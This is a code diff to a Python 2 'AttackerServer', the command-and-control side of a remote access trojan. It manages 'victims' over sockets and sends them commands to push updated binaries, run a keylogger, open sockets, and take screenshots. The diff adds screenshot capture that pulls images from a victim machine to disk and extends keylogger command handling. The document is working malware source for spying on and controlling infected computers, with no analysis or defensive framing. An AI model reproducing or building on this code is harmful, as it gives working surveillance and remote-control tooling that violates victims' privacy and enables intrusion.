@@ -5,8 +5,9 @@ import os
 import sys
 from threading import Thread
 from time import sleep
+from PIL import Image
 
-SERVER_IP = '127.0.0.1'
+SERVER_IP = '127.0.0.1'  # '10.0.0.1'  #
 SERVER_PORT = 2005
 PORT_INDEX = 1
 SOCKET_RECV_BYTES = 1024
@@ -31,14 +32,17 @@ class AttackerServer:
             3: self.open_socket,
             4: self.update_version,
             5: self.change_socket,
-            6: self.key_logger
+            6: self.key_logger,
+            7: self.screenshot
         }
 
     def update_version(self, client_socket, command_message):
         list_arg = command_message.split(';')
         client_socket.send(
-            "{commnd_code};{file_size}".format(commnd_code=list_arg[0], file_size=os.path.getsize(list_arg[1])))
-        with open(list_arg[1], 'rb') as file_to_send:
+            "{file_size}".format(file_size=os.path.getsize(list_arg[2])))
+        # client_socket.send(
+        #     "{commnd_code};{file_size}".format(commnd_code=list_arg[0], file_size=os.path.getsize(list_arg[2])))
+        with open(list_arg[2], 'rb') as file_to_send:
             bytes_to_send = file_to_send.read(SOCKET_RECV_BYTES)
             while bytes_to_send:
                 client_socket.send(bytes_to_send)
@@ -53,7 +57,7 @@ class AttackerServer:
 
     def show_victim(self, client_socket, command_message):
         # print self.get_socket_str(client_socket)
-        for i, victim in enumerate(self.victim_list):
+        for i, victim in enumerate(self.open_client_sockets):
             print i, ')', self.get_socket_str(victim)
 
     def terminate(self, client_socket, params):
@@ -90,8 +94,32 @@ class AttackerServer:
     def change_socket(self, client_socket, command_message):
         client_socket.send(command_message)
 
-    def key_logger(self, client_socket, command_message):
+    def screenshot(self, client_socket, command_message):
         client_socket.send(command_message)
+        img_size = client_socket.recv(10)
+        print 'img_size: ', img_size
+
+        # bytes = []
+
+        num = int(img_size)
+        with open('try.png', 'wb') as f:
+            while num > SOCKET_RECV_BYTES:
+                data = client_socket.recv(SOCKET_RECV_BYTES)
+                f.write(data)
+                num -= SOCKET_RECV_BYTES
+            data = client_socket.recv(num)
+            f.write(data)
+
+        # img = Image.frombytes(mode='RGB', size=int(img_size), data=bytes)
+        # img.save("client.png")
+
+        # image = client_socket.recv(SOCKET_RECV_BYTES)
+
+    def key_logger(self, client_socket, command_message):
+        params = command_message.split(';')[2:]
+        client_socket.send(';'.join(['6'] + params))
+        response = client_socket.recv(SOCKET_RECV_BYTES)
+        print 'key logger response: ', response
 
     def decryption(self, message):
         # TODO: implement
@@ -102,7 +130,6 @@ class AttackerServer:
 
     def get_victim(self, command_msg):
         try:
-            print 'command_msg ', command_msg
             curr_socket = command_msg.split(';')[1]
             print 'curr_socket , ', curr_socket
             curr_socket_tuple = (curr_socket.split(':')[0], int(curr_socket.split(':')[1]))
@@ -128,7 +155,8 @@ class AttackerServer:
                 # client socket case -> existing client
                 else:
                     try:
-                        print '.....New data from client.....'
+                        # print '.....New data from client.....'
+                        sleep(100)
                         data = current_socket.recv(SOCKET_RECV_BYTES)
                         if data == "":
                             self.open_client_sockets.remove(current_socket)
@@ -142,62 +170,65 @@ class AttackerServer:
                         print 'Exception occurred in receive: ', e
 
     def handle_attacker_command(self):
+
         while True:
-            command_message = raw_input('attacker$')
+            try:
+                command_message = raw_input('attacker$')
 
-            if command_message == '':
-                continue
+                if command_message == '':
+                    continue
 
-            command_id = self.get_command_id(command_message)
-            print 'command_id ', command_id
+                command_id = self.get_command_id(command_message)
+                # print 'command_id ', command_id
 
-            victim = self.get_victim(command_message)
-            print 'victim ', victim
+                victim = self.get_victim(command_message)
 
-            if victim:
-                print 'victim: (', self.get_socket_str(victim), '), command: ', command_message
-            else:
-                print 'all victims'
+                if victim:
+                    print 'victim: (', self.get_socket_str(victim), '), command: ', command_message
+                else:
+                    print 'all victims'
 
-            if command_id in self.command_dict:
-                # for victim in self.victim_list:
-                self.command_dict[command_id](victim, command_message)
+                if command_id in self.command_dict:
+                    # for victim in self.victim_list:
+                    self.command_dict[command_id](victim, command_message)
 
-                # else:    ??????????
-                #     for wsocket in victim_list:
-                #         print '[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], self.action_message)
-                #         wsocket.send(command_message)
-                # wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))
-
+                    # else:    ??????????
+                    #     for wsocket in victim_list:
+                    #         print '[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], self.action_message)
+                    #         wsocket.send(command_message)
+                    # wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))
 
 
-                # if msvcrt.kbhit():  # if the client typed character
-                #     char = msvcrt.getch()  # get this character
-                #     self.msg += char
-                #     sys.stdout.write(char)
-                #     sys.stdout.flush()
-                #
-                #     if chr(KEY_ENTER) is char:  # if enter
-                #         self.msg = ''
-                #         command_message = ''.join(self.action_message)
-                #         print '[Attacker]', command_message
-                #         command_id = self.get_command_id(command_message)
-                #         if command_id in self.command_dict:
-                #             self.command_dict[command_id](victim_list[0], command_message)
-                #         else:
-                #             for wsocket in victim_list:
-                #                 print '[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], self.action_message)
-                #                 wsocket.send(command_message)
-                #                 # wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))
-                #
-                #         del self.action_message[:]  # clean array
-                #
-                #     elif ord(char) == KEY_BACKSPACE:  # backspace
-                #         self.action_message.pop()
-                #
-                #     else:
-                #         # else just append the character to the message
-                #         self.action_message.append(char)
+
+                    # if msvcrt.kbhit():  # if the client typed character
+                    #     char = msvcrt.getch()  # get this character
+                    #     self.msg += char
+                    #     sys.stdout.write(char)
+                    #     sys.stdout.flush()
+                    #
+                    #     if chr(KEY_ENTER) is char:  # if enter
+                    #         self.msg = ''
+                    #         command_message = ''.join(self.action_message)
+                    #         print '[Attacker]', command_message
+                    #         command_id = self.get_command_id(command_message)
+                    #         if command_id in self.command_dict:
+                    #             self.command_dict[command_id](victim_list[0], command_message)
+                    #         else:
+                    #             for wsocket in victim_list:
+                    #                 print '[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], self.action_message)
+                    #                 wsocket.send(command_message)
+                    #                 # wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))
+                    #
+                    #         del self.action_message[:]  # clean array
+                    #
+                    #     elif ord(char) == KEY_BACKSPACE:  # backspace
+                    #         self.action_message.pop()
+                    #
+                    #     else:
+                    #         # else just append the character to the message
+                    #         self.action_message.append(char)
+            except Exception as e:
+                print 'Exception occurred while executing the command: ', e
 
     def start(self):
         try:
